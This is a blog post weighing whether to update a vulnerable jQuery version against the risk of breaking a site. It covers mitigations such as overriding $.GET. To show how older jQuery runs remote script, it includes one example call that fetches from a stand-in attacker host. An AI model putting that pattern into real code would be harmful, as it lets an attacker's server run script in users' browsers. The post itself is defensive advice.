---
layout: post
title: "Should you update jQuery over a hypothetical vulnerability?"
thumbnail: fortune-teller-240.jpg
date: 2018-08-29
---

If the version of jQuery you use contains a vulnerability, you may need to update your site to use a newer version. However, this can break functionality. You need to incorporate that into your decision on how to mitigate the vulnerability.

<!-- photo source: https://www.2ndmlg.marines.mil/Photos/igphoto/2000010532/ -->

## A vulnerability in jQuery

jQuery is a client-side JavaScript library. Like any software it can contain vulnerabilities, but often these can only be exploited if the library is used in some specific way. For example, some versions of jQuery [automatically execute JavaScript](/2017/09/27/some-libraries-evaluate-remote-javascript/) returned from a request. This is certainly unexpected and can lead to vulnerabilities: you call `$.GET("http://attacker.com/picture.gif")`, the attacker returns a JavaScript response from his server and this is executed on the page.

If you use user input URLs in `$.GET` calls, you are vulnerable to this attack. But what if you don't?

## Hypothetical vulnerabilities

If you don't use the library in a way that makes your site vulnerable, there is no vulnerability. However, it is still a good idea to update your jQuery version. You may not retrieve user-provided URLs now, but maybe you'll develop it in the future. Maybe you made a mistake when checking your code for vulnerable usage of the library, or maybe the vulnerable code is in a third-party component.

However, if you've checked your code for vulnerable calls and didn't find any, the risk may seem largely theoretical. In that case, is it worth the risk of breaking your site by updating jQuery?

## Updating jQuery may break your site

When updating jQuery, the newer version may have a slightly different interface than the old version. If any of your pages rely on the old behavior, updating jQuery breaks your site. Furthermore, it is pretty hard to check whether this happens. You won't get any compile errors, but have to test the whole site. This means the risk of updating jQuery is pretty big.

Even though it may seem like a big undertaking, [jQuery Migrate](https://github.com/jquery/jquery-migrate) helps you to find any changed interfaces and let your old code work with a newer jQuery version.

## Mitigations

Especially with JavaScript libraries, vulnerabilities can often be mitigated. You could simply override the `$.GET` function to throw an exception if you pass it an absolute URL. Or you could disable JavaScript execution of AJAX responses. This can totally solve even the theoretical vulnerability, without going through the hassle of updating jQuery.

## Assess your risk

Whether you update jQuery or not, you do need to make a informed decision. Weigh the pro's and cons against each other so that it is clear whether updating jQuery is worth the hassle in reduced risk. Decide whether the mitigation of the vulnerability is temporary or permanent. Maybe you are never going to update jQuery ever, but that needs to be a conscious decision rather than a result of everyday churn.

## Conclusion

In the end you need to decide how you reduce the risk of the vulnerability, choosing the solution with the lowest cost. This solution may include updating jQuery throughout your site, but it doesn't have to. The important point is that you make a deliberate decision, weighing risks, costs and benefits against each other.
